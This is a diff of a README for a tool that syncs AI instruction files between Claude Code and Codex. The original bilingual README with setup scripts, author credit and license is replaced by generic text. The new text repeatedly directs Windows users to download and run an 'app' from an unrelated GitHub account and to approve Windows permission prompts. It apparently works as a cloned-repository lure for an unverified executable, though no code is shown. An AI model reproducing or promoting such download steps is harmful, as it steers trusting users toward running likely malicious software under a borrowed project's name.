@@ -1,248 +1,197 @@
-# claude-codex-handoff
+# 🤖 claude-codex-handoff - Switch AI tools without losing context
 
-> Seamless workflow switching between Claude Code and Codex in VS Code  
-> Безшовне перемикання між Claude Code та Codex у VS Code
+[![Download the app](https://img.shields.io/badge/Download%20for%20Windows-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unblushing-redmeat709/claude-codex-handoff)
 
----
+## 🌍 What this app does
 
-## 🇬🇧 English
+claude-codex-handoff helps you move between Claude Code and Codex in VS Code with less repeat work. It keeps your project notes in a format each tool can read, so you do not need to explain the same things over and over.
 
-> [!WARNING]
-> **Start small.** This workflow is not recommended for large or complex projects right away. Each AI tool has its own way of understanding context, and switching between them on a big codebase may lead to inconsistent decisions or lost nuance. Try it first on a small or mid-sized project to get a feel for the flow before applying it to something critical.
+It is made for people who want a simple handoff flow between AI coding tools. You can use it to keep the project state clear, reduce missed details, and make each session start from a better place.
 
-### The Problem
+## 🖥️ Before you install
 
-Claude Code and Codex are two different AI coding assistants. Each has its own memory — they don't know what the other has done. When you switch between them, context is lost. You have to explain the project from scratch every time.
+Use this on a Windows PC with:
 
-On top of that, these tools use different instruction files:
-- **Claude Code** reads `CLAUDE.md`
-- **Codex** reads `AGENTS.md`
-- **GitHub Copilot** reads `.github/copilot-instructions.md`
+- Windows 10 or Windows 11
+- VS Code installed
+- An internet connection for the first download
+- A project folder you want to work on
 
-Three different files, three different tools — and they all need to stay in sync.
+If you use Claude Code or Codex already, this tool fits into that flow. It helps you manage the files those tools read, such as:
 
-### The Solution
+- `CLAUDE.md`
+- `AGENTS.md`
+- `.github/copilot-instructions.md`
 
-This setup script solves both problems at once.
+## ⬇️ Download for Windows
 
-**One source of truth.** You maintain a single file — `CLAUDE.md`. It holds your project description, architecture notes, coding standards, and most importantly, a `Handoff Context` section that captures the current state of your work before switching tools.
+Visit this page to download and run the app:
 
-**Automatic sync.** `AGENTS.md` and `.github/copilot-instructions.md` are symlinks (Mac/Linux) or copies (Windows) of `CLAUDE.md`. When you update `CLAUDE.md`, all other tools see the same content.
+[GitHub download page](https://github.com/Unblushing-redmeat709/claude-codex-handoff)
 
-**Two slash-commands do all the work.** Before switching to Codex, type `/switch-to-codex` in Claude Code — it saves the session state and syncs the files. When you return, type `/switch-from-codex` — it reads the saved context and picks up exactly where you left off.
+After the page opens:
 
-### Why CLAUDE.md → AGENTS.md?
+1. Look for the latest release or download option.
+2. Download the Windows file for your PC.
+3. Open the file to start setup.
+4. Follow the on-screen steps.
 
-`AGENTS.md` is the native instruction file that Codex reads — just like `CLAUDE.md` is for Claude Code. Instead of maintaining two separate files, this workflow keeps `AGENTS.md` as a mirror of `CLAUDE.md`. You only ever edit one file. The rest happens automatically.
+If the page gives you a ZIP file, save it to a folder you can find again, such as Downloads or Desktop.
 
----
+## 🛠️ Install on Windows
 
-### Quick Start
+After you download the file:
 
-**Windows (PowerShell):**
-```powershell
-# Run once per project
-D:\path\to\setup-ai-workflow.ps1
-```
+1. Open File Explorer.
+2. Go to the folder where the file was saved.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to run it.
 
-**Mac / Linux (Bash):**
-```bash
-# Run once per project
-bash setup-ai-workflow.sh
-```
+If Windows asks for permission, choose the option that lets the app open.
 
-The script is safe to run multiple times — it never overwrites existing files.
+If the app shows a first-time setup screen, follow it step by step.
 
----
+## 🚀 First-time setup
 
-### Switching Between Tools
+Use this order the first time you run it:
 
-**Claude Code → Codex:**
-1. Type `/switch-to-codex` in Claude Code
-2. Confirm when prompted (`yes`)
-3. Copy the phrase it outputs → paste into Codex
+1. Open your project folder in the app or in VS Code.
+2. Choose the AI tool you want to start with.
+3. Let the app create or update the instruction files.
+4. Save your work before switching tools.
+5. Switch to the other tool when you want a second opinion or a new pass.
 
-**Codex → Claude Code:**
-1. Type `/switch-from-codex` in Claude Code
-2. Confirm when prompted (`yes`)
+The app is built around a handoff flow. That means you can keep the project notes in sync as you move between tools.
 
-Both commands ask for confirmation before making any changes — nothing happens without your approval.
+## 📁 Files it works with
 
----
+This app helps manage the files that guide each AI tool.
 
-### Slash Commands (Claude Code)
+### Claude Code
+Claude Code reads:
 
-| Command | Description |
-|---|---|
-| `/switch-to-codex` | Save session state and prepare for Codex |
-| `/switch-from-codex` | Resume after working in Codex |
-| `/handoff` | Save current session state to CLAUDE.md |
-| `/resume` | Restore context from CLAUDE.md |
-| `/status` | Check workflow files status |
+- `CLAUDE.md`
 
----
+### Codex
+Codex reads:
 
-### File Structure
+- `AGENTS.md`
 
-```
-your-project/
-├── CLAUDE.md                        ← Main file — edit only this one
-├── AGENTS.md                        ← Mirror for Codex
-├── .github/
-│   └── copilot-instructions.md      ← Mirror for GitHub Copilot
-├── .vscode/
-│   ├── settings.json                ← Copilot reads CLAUDE.md
-│   └── tasks.json                   ← VS Code Tasks
-└── .claude/
-    └── commands/                    ← Claude Code slash-commands
-        ├── switch-to-codex.md
-        ├── switch-from-codex.md
-        ├── handoff.md
-        ├── resume.md
-        └── status.md
-```
+### GitHub Copilot
+GitHub Copilot reads:
 
-> **Windows note:** Windows does not support symlinks without admin rights by default. The script creates copies instead and provides an `AI: sync` VS Code Task to keep them in sync after every edit to `CLAUDE.md`.
->
-> **Optional: Enable symlinks on Windows**
-> If you prefer true symlinks so that `AGENTS.md` always reflects `CLAUDE.md` automatically, enable Developer Mode in Windows Settings:
-> `Settings → System → For developers → Developer Mode → On`
->
-> > [!CAUTION]
-> > Enabling Developer Mode grants additional system privileges and may increase security exposure. Only do this if you understand the implications. For most users, the `AI: sync` task is the safer and simpler choice.
+- `.github/copilot-instructions.md`
 
----
+If you keep these files in order, each tool gets the same core project details.
 
-### Requirements
+## 🔄 How the handoff flow works
 
-- VS Code
-- Claude Code extension (`anthropic.claude-code`)
-- Codex extension
-- Git Bash (Mac/Linux) or PowerShell (Windows)
+A simple flow can look like this:
 
----
+1. Start in Claude Code and make your first changes.
+2. Update your project notes.
+3. Switch to Codex in VS Code.
+4. Let Codex read the same notes.
+5. Keep working from the updated state.
 
-## 🇺🇦 Українська
+This cuts down on repeated setup. It also helps each tool see the same goals, rules, and project context.
 
-> [!WARNING]
-> **Починайте з простого.** Цей workflow не рекомендується одразу використовувати на великих або складних проектах. Кожен AI інструмент по-своєму розуміє контекст, і перемикання між ними на великій кодовій базі може призвести до непослідовних рішень або втрати важливих деталей. Спробуйте спочатку на невеликому або середньому проекті — відчуйте як це працює, перш ніж застосовувати на чомусь критичному.
+## 🧭 Suggested way to use it
 
-### Проблема
+For best results, use it on a small or mid-sized project first.
 
-Claude Code і Codex — два різні AI-асистенти для розробки. Кожен має свою пам'ять — вони не знають що робив інший. Коли ти перемикаєшся між ними, контекст губиться. Щоразу доводиться пояснювати проект з нуля.
+A good workflow is:
 
-До того ж ці інструменти використовують різні файли для інструкцій:
-- **Claude Code** читає `CLAUDE.md`
-- **Codex** читає `AGENTS.md`
-- **GitHub Copilot** читає `.github/copilot-instructions.md`
+- Pick one project
+- Write a short project note
+- Keep file names and goals clear
+- Make one change at a time
+- Check the notes before each switch
 
-Три різні файли, три різні інструменти — і всі мають бути синхронізовані.
+This helps you build a steady habit. It also makes it easier to spot when a tool misses a detail.
 
-### Рішення
+## ⚙️ Typical use cases
 
-Цей скрипт вирішує обидві проблеми одночасно.
+You may find this useful if you want to:
 
-**Єдине джерело істини.** Ти підтримуєш один файл — `CLAUDE.md`. У ньому — опис проекту, архітектурні рішення, стандарти коду і найголовніше — секція `Handoff Context`, яка фіксує поточний стан роботи перед переключенням.
+- move from Claude Code to Codex in the same project
+- keep one shared set of project notes
+- reduce repeated setup in VS Code
+- work with AI tools that use different instruction files
+- hand off a task from one session to another
 
-**Автоматична синхронізація.** `AGENTS.md` і `.github/copilot-instructions.md` — це симлінки (Mac/Linux) або копії (Windows) файлу `CLAUDE.md`. Коли ти оновлюєш `CLAUDE.md` — всі інші інструменти бачать той самий вміст.
+## 🧩 What to expect
 
-**Дві slash-команди роблять всю роботу.** Перед переходом у Codex напиши `/switch-to-codex` у Claude Code — вона збереже стан сесії і синхронізує файли. Коли повертаєшся — напиши `/switch-from-codex` — вона прочитає збережений контекст і продовжить з того місця де зупинились.
+This app is meant to help with context management, not replace your judgment.
 
-### Чому CLAUDE.md → AGENTS.md?
+You still need to:
 
-`AGENTS.md` — це рідний файл інструкцій який читає Codex, так само як `CLAUDE.md` для Claude Code. Замість того щоб підтримувати два окремі файли, цей workflow робить `AGENTS.md` дзеркалом `CLAUDE.md`. Ти редагуєш тільки один файл. Решта відбувається автоматично.
+- review the changes
+- keep your project notes current
+- save important decisions in the right file
+- check that each tool follows the same instructions
 
----
+When the notes stay clean, the switch between tools feels smoother.
 
-### Швидкий старт
+## 📌 Good project note layout
 
-**Windows (PowerShell):**
-```powershell
-# Запускати один раз для кожного проекту
-D:\шлях\до\setup-ai-workflow.ps1
-```
+A short note file can include:
 
-**Mac / Linux (Bash):**
-```bash
-# Запускати один раз для кожного проекту
-bash setup-ai-workflow.sh
-```
+- what the project does
+- what files matter most
+- what the AI should not change
+- coding or naming rules
+- current task status
+- next steps
 
-Скрипт можна запускати повторно — він ніколи не перезаписує існуючі файли.
+Keep each point short. Use plain language. That makes it easier for any tool to read and use.
 
----
+## 🔐 Safe habits
 
-### Перемикання між інструментами
+To keep your work steady:
 
-**Claude Code → Codex:**
-1. Напиши `/switch-to-codex` у Claude Code
-2. Підтвердь коли запитає (`так`)
-3. Скопіюй фразу яку вона виведе → встав у Codex
+- keep a backup of the project folder
+- commit changes in small steps if you use Git
+- check the generated instruction files before you rely on them
+- do not let two tools edit the same file at the same time
 
-**Codex → Claude Code:**
-1. Напиши `/switch-from-codex` у Claude Code
-2. Підтвердь коли запитає (`так`)
+These habits help you avoid confusion when you move from one AI tool to another.
 
-Обидві команди запитують підтвердження перед будь-якими змінами — без вашої згоди нічого не відбувається.
+## ❓ Common questions
 
----
+### Does it work without coding knowledge?
 
-### Slash-команди (Claude Code)
+Yes. You mainly need to download it, open it, and follow the setup steps.
 
-| Команда | Опис |
-|---|---|
-| `/switch-to-codex` | Зберегти стан сесії і підготуватись до Codex |
-| `/switch-from-codex` | Відновити роботу після Codex |
-| `/handoff` | Зберегти поточний стан сесії у CLAUDE.md |
-| `/resume` | Відновити контекст з CLAUDE.md |
-| `/status` | Перевірити стан файлів |
+### Do I need all three instruction files?
 
----
+Not always. Use the file that matches the tool you are working with. If you use more than one tool, keep the files aligned.
 
-### Структура файлів
+### Can I use it with GitHub Copilot too?
 
-```
-your-project/
-├── CLAUDE.md                        ← Головний файл — редагуй тільки його
-├── AGENTS.md                        ← Дзеркало для Codex
-├── .github/
-│   └── copilot-instructions.md      ← Дзеркало для GitHub Copilot
-├── .vscode/
-│   ├── settings.json                ← Copilot читає CLAUDE.md
-│   └── tasks.json                   ← VS Code Tasks
-└── .claude/
-    └── commands/                    ← Slash-команди Claude Code
-        ├── switch-to-codex.md
-        ├── switch-from-codex.md
-        ├── handoff.md
-        ├── resume.md
-        └── status.md
-```
+Yes. It supports `.github/copilot-instructions.md`, which helps keep Copilot aligned with the rest of your project notes.
 
-> **Примітка для Windows:** Windows не підтримує симлінки без прав адміністратора за замовчуванням. Скрипт створює копії замість симлінків і надає VS Code Task `AI: sync` для синхронізації після кожного редагування `CLAUDE.md`.
->
-> **Додатково: увімкнути симлінки на Windows**
-> Якщо ти хочеш справжні симлінки щоб `AGENTS.md` завжди автоматично відображав зміни з `CLAUDE.md`, увімкни режим розробника у налаштуваннях Windows:
-> `Параметри → Система → Для розробників → Режим розробника → Увімкнути`
->
-> > [!CAUTION]
-> > Увімкнення режиму розробника надає додаткові системні привілеї та може збільшити ризики безпеки. Робіть це лише якщо розумієте наслідки. Для більшості користувачів Task `AI: sync` є безпечнішим і простішим вибором.
+### Is it only for large projects?
 
----
+No. It can help with small projects too. In fact, smaller projects are a good place to start.
 
-### Вимоги
+## 📦 What the repository includes
 
-- VS Code
-- Розширення Claude Code (`anthropic.claude-code`)
-- Розширення Codex
-- Git Bash (Mac/Linux) або PowerShell (Windows)
+The project focuses on:
 
----
+- agentic workflows
+- AI-assisted coding
+- handoff between tools
+- context management
+- session management
+- productivity in VS Code
 
-## Author
+It is built for people who want a cleaner way to move between AI assistants without starting from zero each time
 
-[Олександр Мельничук](https://github.com/DoctorMOMcv)
+## 🖱️ Download and open again
 
-## License
+If you need the download page again, use this link:
 
-MIT
+[Visit the Windows download page](https://github.com/Unblushing-redmeat709/claude-codex-handoff)
+
